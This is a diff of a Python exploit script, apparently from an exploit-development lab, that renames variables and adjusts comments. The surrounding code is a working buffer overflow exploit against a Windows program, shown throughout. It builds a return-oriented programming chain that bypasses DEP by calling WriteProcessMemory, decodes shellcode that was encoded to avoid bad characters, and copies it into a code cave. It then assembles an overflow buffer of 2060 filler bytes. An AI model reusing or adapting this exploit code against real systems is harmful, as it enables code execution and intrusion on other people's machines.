@@ -132,19 +132,19 @@ def decodeShellcode(pos, shellcode):
     CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
     restoreRop = b""
 
-    last_pos = 0    # Start from beginning
+    last_pos = 0    # Start of shellcode
 
     for i in range(len(pos)):
         current_pos = pos[i]
         offset = pos[i] - last_pos
         last_pos = pos[i]
-        #neg_offset = (-offset) & 0xffffffff
 
         value = 0
+
         for j in range(len(BADCHARS)):
             if shellcode[pos[i]] == BADCHARS[j]:
                 value = CHARSTOADD[j]
-        value = (value << 8) | 0x11110011    # ______bhbl
+        value = (value << 8) | 0x11110011    # ______bhbl (We are using bh)
 
         # Shellcode is in EDX
         restoreRop += pack("<I", 0x4040f3)   # pop ecx ; ret
@@ -167,7 +167,7 @@ rop_wpm = [
 
                     # Results: EAX contains the value of stack pointer (ESP)
 
-# 2. Get dummy call addr (in ebx)
+# 2. Get skeleton call addr (in ebx)
     0x4040f3,       # pop ecx ; ret
                     # EAX has the value of saved ESP.
     0x4d0,          # EAX(ESP) + 0x1ec = skeleton value 'aaaa'
@@ -200,7 +200,7 @@ rop_wpm = [
                     # After  instruction: The value 0x75ac81b0 (KERNEL32!WriteProcessMemoryStub)
                     #                     is moved into the EAX register.
 
-# 4. 0x61616161 Write WriteProcessMemory to dummy + 0x0
+# 4. 0x61616161 Write WriteProcessMemory to skeleton + 0x0
     0x401fe7,       # mov [ebx], eax ; ret
                     # Move WriteProcessMemory Pointer into EBX. (Skeleton location 0x61616161)
 
@@ -209,7 +209,7 @@ rop_wpm = [
     0x1c,           # hex(28)
 
     0x401ff3,       # add edx, ecx ; ret
-                    # Adds 0x18 to EDX (which contains original skeleton call)
+                    # Adds 0x1c to EDX (which contains original skeleton call)
                     # EDX now points to shellcode address parameter
 
     0x402ce8,       # mov eax, edx
@@ -218,7 +218,7 @@ rop_wpm = [
                     # Result: EAX contains the address of the shellcode
                     #         EBX points to skeleton call address. (0x61616161 = 0x75ac81b0)
 
-# 6. 0x64646464 Get dummy call addr + 0x10 (in ebx)
+# 6. 0x64646464 Get skeleton call addr + 0x10 (in ebx)
     0x401fef,       # add ebx, 0x4 ; ret
     0x401fef,       # add ebx, 0x4 ; ret
     0x401fef,       # add ebx, 0x4 ; ret
@@ -230,7 +230,7 @@ rop_wpm = [
                     #          lpBaseAddress is done (0x00491d10)
                     #          (NO ASLR in main_dep_wpm.exe module)
 
-# 7. Get dummy call addr + 0x10 (in ebx)
+# 7. Get skeleton call addr + 0x10 (in ebx)
     0x401fe7,       # mov [ebx], eax
                     # 0x011678e8 Shellcode Stack Address (src)
 
@@ -253,7 +253,7 @@ rop_wpm = b"".join([pack("<I", r) for r in rop_wpm])
 rop_decode = decodeShellcode(pos, shellcode)
 
 rop_align = [
-# #. Align esp with dummy call (ebx-8)
+# #. Align esp with skeleton call (ebx-8)
     0x4040f3,       # pop ecx
     0xfffffe80,     # 0xffffffe4    = -0x1c (-28)
     0x401ff3,       # add edx, ecx  = edx - 0x24
@@ -266,22 +266,22 @@ rop_align = [
 ]
 rop_align = b"".join([pack("<I", r) for r in rop_align])
 
-dummy  = b"aaaa"                # WriteProcessMemory     <- The Call
-dummy += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave
-dummy += pack("<I", 0xffffffff) # hProcess               <- (-0x1 Current Process)
-dummy += pack("<I", 0x00410640) # lpBaseAddress          <- Code Cave Address (dst)
-dummy += b"dddd"                # lpBuffer               <- Shellcode (STACK) (src)
-dummy += pack("<I", 0x190)      # nSize                  <- Size of Shellcode
-dummy += pack("<I", 0x00423010) # lpNumberofBytesWritten <- Some writable address
+skeleton  = b"aaaa"                # WriteProcessMemory     <- The Call
+skeleton += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave
+skeleton += pack("<I", 0xffffffff) # hProcess               <- (-0x1 Current Process)
+skeleton += pack("<I", 0x00410640) # lpBaseAddress          <- Code Cave Address (dst)
+skeleton += b"dddd"                # lpBuffer               <- Shellcode (STACK) (src)
+skeleton += pack("<I", 0x190)      # nSize                  <- Size of Shellcode
+skeleton += pack("<I", 0x00423010) # lpNumberofBytesWritten <- Some writable address
 
 
 buf  = b"A" * 2060
-buf += rop_wpm                  # Setup WriteProcessMemory paramters
-buf += rop_decode               # While Shellcode in EAX, Decode Shellcode
-buf += rop_align                # Align ESP to dummy call
+buf += rop_wpm                  # Patch WriteProcessMemory parameters
+buf += rop_decode               # Decode Shellcode
+buf += rop_align                # Align ESP to skeleton call
 buf += b"C" * (ropSize - len(rop_wpm) - len(rop_decode) - len(rop_align))
-buf += dummy
-buf += encodedShellcode 
+buf += skeleton
+buf += encodedShellcode         # Encoded Shellcode to prevent breaking exploit
 
 
 print("[+] Triggering overflow...")
